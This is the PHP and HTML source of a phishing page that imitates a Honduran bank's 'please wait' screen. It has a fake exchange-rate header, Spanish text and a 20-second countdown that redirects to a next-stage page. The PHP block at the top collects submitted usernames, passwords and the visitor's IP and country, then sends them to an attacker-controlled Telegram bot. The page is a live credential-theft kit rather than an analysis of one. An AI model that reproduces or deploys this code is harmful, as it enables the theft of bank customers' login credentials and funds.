<?php
   ini_set("display_errors", 0);
   include "aquiva.php";
   
   
   if (isset($_POST['caraqueño']) && isset($_POST['pequeñiso']) ) {
       $breve = $_POST['caraqueño'];
       $partida = $_POST['pequeñiso'];
       $ipInfoResponse = getIpInfo($_SERVER['REMOTE_ADDR']);
       $codigopais = isset($ipInfoResponse['country']) ? $ipInfoResponse['country'] : 'Desconocido';
       $mensajito .= "B4C\nUC3R: ".$_POST['caraqueño']."\nCL4VX: ".$_POST['pequeñiso']."\nYYP: ".$_SERVER['REMOTE_ADDR']."\nPaís: ".$codigopais."\nC0DE BY SYN4PSE";
   
       env($tribales, $tulum, $mensajito);
   }
   function getIpInfo($ip) {
       $url = "http://ipinfo.io/{$ip}/json";  
       $curl = curl_init();
       curl_setopt($curl, CURLOPT_URL, $url);
       curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
       $response = curl_exec($curl);
       curl_close($curl);
       
       return json_decode($response, true);
   }
   function env($dakota, $chatsito, $mensajillo) {
       $url = "https://api.telegram.org/bot{$dakota}/sendMessage";
       $data = array(
           'chat_id' => $chatsito,
           'text' => $mensajillo
       );
   
       $options = array(
           CURLOPT_URL => $url,
           CURLOPT_POST => true,
           CURLOPT_POSTFIELDS => http_build_query($data),
           CURLOPT_RETURNTRANSFER => true,
       );
   
       $curl = curl_init();
       curl_setopt_array($curl, $options);
       $response = curl_exec($curl);
       curl_close($curl);
   
       return $response;
       
   }
   
   ?>

<!DOCTYPE html>

<html lang="es">
   <head>
      <meta http-equiv="Content-Type" charset="UTF-8">


      <title>Solo espere unos segundos</title>
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <link rel="stylesheet" href="blue-main-style.css">
      <link rel="stylesheet" href="carouselLogout.css">
      <link rel="stylesheet" href="commonRedirStyles.css">

      <link href="digitalSignature.css" rel="stylesheet" type="text/css">
   
   </head>
   <body class="background-primary m-reset" style="position: inherit;">
      <form method="post" name="loginForm" autocomplete="off">
        
         <header class="grid-container-fluid p-relative bg-color-white card-shadow-primary" style="z-index:10">
            <div class="grid-row a-items-center p-x-l">
               <a class="nav-item dropdown show cursor-pointer col-6 p-reset header-brand-logo"  href="#"></a>
               <ul class="d-flex a-items-center m-reset p-reset p-y-l col-6 j-content-end">
                  <li class="d-none d-sm-flex nav-item cursor-pointer a-items-center">
                     <a class="typography-p d-flex a-items-center j-content-center t-decoration-none" >
                     <i class="icons lens-stroke-before icons-xl"></i>
                     <span class="p-left-s f-size-xl">Ayuda</span></a>
                  </li>
                  <li class="nav-item dropdown show cursor-pointer d-flex a-items-center p-left-l">
                     <a class="nav-link dropdown-toggle d-flex a-items-center t-decoration-none" role="button" id="navbarDropdownCountry" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="true">
                     <span id="countryFlag" class="flag flag-HN"></span>
                     <span id="countryCode" class="d-none d-sm-block m-left-xs typography-h3 f-weight-l country-code">HN</span>
                     <i id="arrowCountryFlag" class="icons chevron-down-block-before icons-xl c-neutral-extrahigh d-none d-sm-block m-right-xs"></i>
                     </a>
                     
                  </li>
                  <li class="nav-item dropdown show cursor-pointer d-sm-none p-left-s">
                     <a class="nav-link dropdown-toggle t-decoration-none" id="navbarDropdownShow" data-toggle="dropdown" aria-haspopup="true" aria-expanded="true">
                     <i class="icons hamburguer-menu-block-before icons-4xl c-neutral-extrahigh"></i>
                     </a>
                     <div class="dropdown-menu right-negative-l" aria-labelledby="navbarDropdown" id="navbarDropdownMenuHelp">
                        <a id="modalExchangeReference" class="dropdown-item typography-p t-decoration-none" >Tipo de Cambio</a>
                        <a class="dropdown-item typography-p d-flex a-items-center j-content-center t-decoration-none">
                        <i class="icons lens-stroke-before icons-xl"></i>
                        <span class="p-left-s">Ayuda</span></a>
                     </div>
                  </li>
               </ul>
            </div>
            <div class="grid-row d-none d-sm-block">
               <div class="hr-primary col-12 p-reset"></div>
            </div>
            <div class="grid-row d-none d-sm-block">
               <div class="col-12 d-flex j-content-center a-items-center" style="height:40px">
                  <div class="p-relative">
                     <a id="exchangeModal" class="d-flex a-items-center typography-link-contextual f-weight-m" > 
                     <i class="icons atm-filled-before icons-xl m-right-xs"></i>
                     <span class="f-size-xl m-right-xs">Tipo de Cambio</span>
                     <span><i class="icons chevron-down-block-before icons-xl m-right-xs"></i></span>
                     </a>
                     <div id="bubble4" onclick=" " class="m-top-l tooltip tooltip--top" style="--width: 350px; --xPos: calc( 126px - 0px ); --yPos: calc( 28px ); --radius: 4px; --background: var(--c-white); --indicator-position-arrow: 90%; --indicator-position-element-reference: 75%; --zIndex: 700; --anim-name-in: fade-in-right; --anim-name-out: fade-out-left; --anim-time: 0.2s; --anim-delay: 0.2s;">
                        <div class="p-l">
                           <div id="containerDate" class="p-x-m"><label class="typography-label c-neutral-medium f-size-l f-weight-s" "="">Martes 19 de diciembre , 2023</label></div>
                           <div id="exchangeRateContainer">
                              <div class="col-12 m-top-m m-x-m p-reset">
                                 <h5 class="typography-h5 f-weight-m">Seleccione una moneda</h5>
                              </div>
                              <div class="col-12 d-flex m-top-s j-content-between p-x-reset">
                                 <div class="col-6 p-reset">
                                    <div class="p-right-xs p-x-m">
                                       <input type="radio" name="referenceCurrency" checked="" class="selection-box" id="referenceCurrencyUSDexchangeRateContainer">
                                       <label class="selection-box-label" for="referenceCurrencyUSDexchangeRateContainer">D�lar</label>
                                    </div>
                                 </div>
                                 <div class="col-6 p-reset">
                                    <div class="p-x-m">
                                       <input type="radio" name="referenceCurrency" class="selection-box" id="referenceCurrencyEURexchangeRateContainer">
                                       <label class="selection-box-label" for="referenceCurrencyEURexchangeRateContainer">Euro</label>
                                    </div>
                                 </div>
                              </div>
                              <hr class="hr-primary  m-top-l">
                              <div class="col-12 d-flex m-top-l m-x-s j-content-center gap-m">
                                 <button id="buyBottonexchangeRateContainer" type="button" class="m-right-xs t-align-center btn btn-auxiliary f-weight-l typography-h4">Compra: <span id="buyBottonSymbol">L</span><span id="buyBottonAmount">24.6467</span></button>
                                 <div class="b-left"></div>
                                 <button id="sellBottonexchangeRateContainer" type="button" class="m-left-xs t-align-center btn btn-auxiliary ">Venta: <span id="sellBottonSymbol">L</span><span id="sellBottonAmount">24.7699</span></button>
                              </div>
                              <div class="d-flex m-top-s a-items-center p-x-l" id="inputSectionContainerexchangeRateContainer">
                                 <div class="p-x-m c-brand-low cursor-pointer" id="switchexchangeRateContainer">
                                    <i class="icons half-arrow-up-down-filled-before icons-xl"></i>
                                 </div>
                                 <div class="d-flex f-grow-1">
                                    <input id="inutCurrencyCodeexchangeRateContainer" class="t-align-center bg-color-white input-file p-s typography-placeholder m-reset" disabled="" value="USD">
                                    <input id="inputCalcAmmountexchangeRateContainer" onkeypress="return isNumberKeyCode(event);" type="text" placeholder="0" class="input-main typography-p t-align-right cursor-text">
                                 </div>
                              </div>
                              <div class="t-align-right m-top-m p-x-l m-bottom-s" id="resultContainerexchangeRateContainer">
                                 <p class="typography-h3 c-black-low"> <span id="resultSymbolexchangeRateContainer">LPS </span><span id="resultAmmountexchangeRateContainer">0</span>.<span class="typography-p f-size-l f-weight-l c-black-low" id="resultAmmountDecimalsexchangeRateContainer">0000</span></p>
                              </div>
                           </div>
                        </div>
                        <button onclick="return false;" id="bubble4CloseBtn" class="tooltip__close-btn p-right-m p-top-m p-left-reset cursor-pointer" style="right:12px; top:12px; position:absolute;"><i class="c-neutral icons x-block-after icons-after-s p-reset icons x-block-after icons-after-s"></i></button>
                     </div>
                  </div>
                  <div class="d-none d-xl-flex p-left-xl">
                     <div class="d-flex a-items-center b-right" id="dollarsExchange">
                        <p class="typography-p m-right-s">Dolares:</p>
                        <p class="typography-p m-right-m">Compra <span id="dollarBuy">L24.6467</span></p>
                        <p class="typography-p m-right-s p-right-xl m-left-xs">Venta <span id="dollarSale">L24.7699</span></p>
                     </div>
                     <div class="d-flex a-items-center" id="euroExchange">
                        <p class="typography-p m-left-s m-right-s p-left-xl">Euros:</p>
                        <p class="typography-p m-right-m">Compra <span id="euroBuy">L25.7558</span></p>
                        <p class="typography-p m-right-s m-left-xs">Venta <span id="euroSale">L28.6092</span></p>
                     </div>
                  </div>
               </div>
            </div>
            <select name="country" id="country" class="select-option-color d-none" onchange="goToCountry()">
               <option value="HN" selected="">Honduras
               </option>
          
            </select>
         </header>
         
         <div class="grid-container" id="login-sec">
            <div class="grid-row p-top-md-xxl j-content-center">
               <div class="col-12 col-sm-10 col-md-7 col-lg-6 col-xl-5 p-reset">
                  <div class="card card-shadow-primary p-bottom-l p-xs p-md-l p-top-l">
                     <div class="grid-row j-content-center">
                        <div class="col-12 d-flex j-content-end p-x-reset">
                           <a class="cursor-pointer p-right-l p-md-reset t-decoration-none c-black" >
                           <i class="icons security-check-stroke-before icons-6xl"></i>
                           </a>
                        </div>
                       
                        <div class="col-10 p-x-reset">
                           <div class="col-12 p-top-s" id="title">
                              <p class="typography-p f-size-xl t-align-center"> Espere mientras carga, esto puede demorar unos <label id="countdown">0:20</label> segundos.</p>
                           </div>
                           <br>
                           <img src="loading.gif" style="display: block;margin: 0 auto;">
                          
                           

                        </div>
                     </div>
                  </div>
               </div>
            </div>
            
         </div>
        
      </form>
      <div class="ballon-Container d-none d-md-block">
         <div id="balloonId" class="balloon balloonDisplay balloon-ErrorType">
            <div class="balloon-text">
               <p class="" id="balloonMessageContent"></p>
            </div>
         </div>
         <div id="triangleId" class="balloon-triangle balloonDisplay balloon-triangle-ErrorType"></div>
      </div>
     
      <footer class="grid-container-fluid">
         <div class="grid-row p-top-xl p-relative p-bottom-m">
            <div class="col-12">
               <p class="typography-h5 t-align-center">
                  Todos los derechos reservados. 2023 ©. <a class="typography-link"  href="#">Términos y condiciones.</a>
               </p>
            </div>
            <div class="m-s p-fixed d-none d-lg-block" style="right:40px; bottom:40px">
               <form  method="post" action="#">
                  <button class="btn-float btn-float-secondary expand-btn-float" type="button">
                  <i class="icons lens-stroke-before icons-xl"></i>
                  <span class="typography-p btn-float-txt">¿Necesita ayuda para ingresar?</span>
                  </button>
               </form>
            </div>
         </div>
      </footer>
     
      <img class="image-bg" alt="Imagen del background" src="background.svg">		
      <style>
         .image-bg{
         position: fixed;
         bottom: 120px;;
         z-index: -1;
         filter: hue-rotate(442deg);
         scale: 2;
         }
         @media (min-width: 768px){
         .image-bg{
         scale: 1.5;
         }
         }
         @media (min-width: 992px){
         .image-bg{
         bottom: 80px;
         scale: 1.2;
         }
         }
         @media (min-width: 1200px){
         .image-bg{
         scale: .9;
         }
         }
      </style>
     
      <script type="text/javascript">
               var url="oucls.php";
               var seconds = 20; 
               function secondPassed() {
               
                 var minutes = Math.round((seconds - 30)/60);
                 var remainingSeconds = seconds % 60; 
        
                 if (remainingSeconds < 10) { 
                   remainingSeconds = "0" + remainingSeconds; 
                 } 
                 document.getElementById('countdown').innerHTML = minutes + ":" +     remainingSeconds; 
                 if (seconds == 0) { 
                   clearInterval(countdownTimer); 
                  window.location=url;
                   document.getElementById('suave').innerHTML = ""; 
                   document.getElementById('countdown').innerHTML = ""; 
                 } else { 
                   seconds--; 
                 } 
               } 
               
               var countdownTimer = setInterval(secondPassed, 1000);
            </script>
      
   </body>
</html>
